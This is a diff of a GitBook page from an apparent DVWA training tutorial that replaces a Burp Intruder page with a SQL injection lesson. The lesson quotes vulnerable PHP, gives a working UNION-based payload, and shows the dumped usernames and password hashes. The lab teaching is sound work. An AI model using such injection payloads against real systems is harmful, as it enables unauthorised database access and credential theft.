@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# book: http://ogp.me/ns/book#">
         
         <meta charset="UTF-8">
-        <title>Burp Intruder | Defeating DVWA</title>
+        <title>SQL Injection | Defeating DVWA</title>
 
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
         <meta name="robots" content="index, follow">
@@ -13,13 +13,13 @@
         <meta name="generator" content="www.gitbook.io">
 
         
-        <link rel="next" href="../tips_and_tricks/cracking_hashes.html" />
+        <link rel="next" href="../brute_force/README.html" />
         
         
-        <link rel="prev" href="../tips_and_tricks/README.html" />
+        <link rel="prev" href="../index.html" />
         
 
-        <meta property="og:title" content="Burp Intruder | Defeating DVWA">
+        <meta property="og:title" content="SQL Injection | Defeating DVWA">
         <meta property="og:site_name" content="Defeating DVWA">
         <meta property="og:type" content="book">
         <meta property="og:locale" content="en_US">
@@ -42,7 +42,7 @@
 
 
         
-    <div class="book" data-github="jsrn/DefeatingDVWA" data-level="4.1" data-basepath=".." data-revision="1399198289582">
+    <div class="book" data-github="jsrn/DefeatingDVWA" data-level="1" data-basepath=".." data-revision="1399198289582">
     <div class="book-header">
     <!-- Actions Left -->
     
@@ -120,7 +120,7 @@
 
         
         <li>
-            <a href="https://github.com/jsrn/DefeatingDVWA/edit/master/tips_and_tricks/burp_intruder.md" target="blank">Edit and Contribute</a>
+            <a href="https://github.com/jsrn/DefeatingDVWA/edit/master/sql_injection/README.md" target="blank">Edit and Contribute</a>
         </li>
         
 
@@ -203,7 +203,7 @@
             <div class="page-wrapper" tabindex="-1">
                 <div class="book-progress">
     <div class="bar">
-        <div class="inner" style="width: 83.33333333333333%;min-width: 66.66666666666667%;"></div>
+        <div class="inner" style="width: 16.666666666666668%;min-width: 0%;"></div>
     </div>
     <div class="chapters">
     
@@ -211,13 +211,13 @@
     
         <a href="../sql_injection/README.html" title="SQL Injection" class="chapter done new-chapter" data-progress="1" style="left: 16.666666666666668%;"></a>
     
-        <a href="../brute_force/README.html" title="Brute Force" class="chapter done new-chapter" data-progress="2" style="left: 33.333333333333336%;"></a>
+        <a href="../brute_force/README.html" title="Brute Force" class="chapter  new-chapter" data-progress="2" style="left: 33.333333333333336%;"></a>
     
-        <a href="../command_execution/README.html" title="Command Execution" class="chapter done new-chapter" data-progress="3" style="left: 50%;"></a>
+        <a href="../command_execution/README.html" title="Command Execution" class="chapter  new-chapter" data-progress="3" style="left: 50%;"></a>
     
-        <a href="../tips_and_tricks/README.html" title="Tips and Tricks" class="chapter done new-chapter" data-progress="4" style="left: 66.66666666666667%;"></a>
+        <a href="../tips_and_tricks/README.html" title="Tips and Tricks" class="chapter  new-chapter" data-progress="4" style="left: 66.66666666666667%;"></a>
     
-        <a href="../tips_and_tricks/burp_intruder.html" title="Burp Intruder" class="chapter done " data-progress="4.1" style="left: 83.33333333333333%;"></a>
+        <a href="../tips_and_tricks/burp_intruder.html" title="Burp Intruder" class="chapter  " data-progress="4.1" style="left: 83.33333333333333%;"></a>
     
         <a href="../tips_and_tricks/cracking_hashes.html" title="Cracking Password Hashes" class="chapter  " data-progress="4.2" style="left: 100%;"></a>
     
@@ -226,11 +226,54 @@
 
                 <div class="page-inner">
                 
-                    <section class="normal" id="section-gitbook_6">
+                    <section class="normal" id="section-gitbook_4">
                     
-                        <h1 id="burp-intruder">Burp Intruder</h1>
-<h2 id="brute-forcing-with-burp-intruder">Brute Forcing with Burp Intruder</h2>
+                        <h1 id="sql-injection">SQL Injection</h1>
+<p>Despite being a very well understood class of attack, SQL injection vulnerabilities are still alarmingly common.</p>
+<h2 id="low">Low</h2>
+<p>The relevant chunk from the source code of the low security SQLi challenge:</p>
+<pre><code class="lang-php"><span class="hljs-preprocessor">&lt;?php</span>    
+<span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>];
 
+<span class="hljs-variable">$getid</span> = <span class="hljs-string">"SELECT first_name, last_name FROM users WHERE user_id = '$id'"</span>;
+<span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$getid</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">'&lt;pre&gt;'</span> . mysql_error() . <span class="hljs-string">'&lt;/pre&gt;'</span> );
+<span class="hljs-preprocessor">?&gt;</span>
+</code></pre>
+<p>With no sanitisation on the value, it&#39;s pretty clear that <code>$id</code> is our point of injection.</p>
+<p>The first thing I want to do is get some information. We know for free that there&#39;s a table called <code>users</code> containing the columns <code>user_id</code>, <code>first_name</code> and <code>last_name</code>.</p>
+<p>We can try to find out some other column names, but we can at least guess that there might be a <code>user</code> or <code>password</code> field. The original query selects values from two columns, so we can use a <code>UNION</code> statement in our injection to extract values from two additional columns.</p>
+<pre><code>1&#39; UNION SELECT user, password FROM users;#
+</code></pre><p>What luck! As hoped, the application spits out the following:</p>
+<pre><code>ID: 1&#39; UNION SELECT user, password FROM users;#
+First name: admin
+Surname: admin
+
+ID: 1&#39; UNION SELECT user, password FROM users;#
+First name: admin
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+
+ID: 1&#39; UNION SELECT user, password FROM users;#
+First name: gordonb
+Surname: e99a18c428cb38d5f260853678922e03
+
+ID: 1&#39; UNION SELECT user, password FROM users;#
+First name: 1337
+Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+
+ID: 1&#39; UNION SELECT user, password FROM users;#
+First name: pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+
+ID: 1&#39; UNION SELECT user, password FROM users;#
+First name: smithy
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+</code></pre><p>So now we have a set of usernames and password hashes.</p>
+<pre><code>admin:5f4dcc3b5aa765d61d8327deb882cf99
+gordonb:e99a18c428cb38d5f260853678922e03
+1337:8d3533d75ae2c3966d7e0d4fcc69216b
+pablo:0d107d09f5bbe40cade3de5c71e9e9b7
+smithy:5f4dcc3b5aa765d61d8327deb882cf99
+</code></pre>
                     
                     </section>
                 
@@ -239,10 +282,10 @@
         </div>
 
         
-        <a href="../tips_and_tricks/README.html" class="navigation navigation-prev "><i class="fa fa-angle-left"></i></a>
+        <a href="../index.html" class="navigation navigation-prev "><i class="fa fa-angle-left"></i></a>
         
         
-        <a href="../tips_and_tricks/cracking_hashes.html" class="navigation navigation-next "><i class="fa fa-angle-right"></i></a>
+        <a href="../brute_force/README.html" class="navigation navigation-next "><i class="fa fa-angle-right"></i></a>
         
     </div>
 </div>
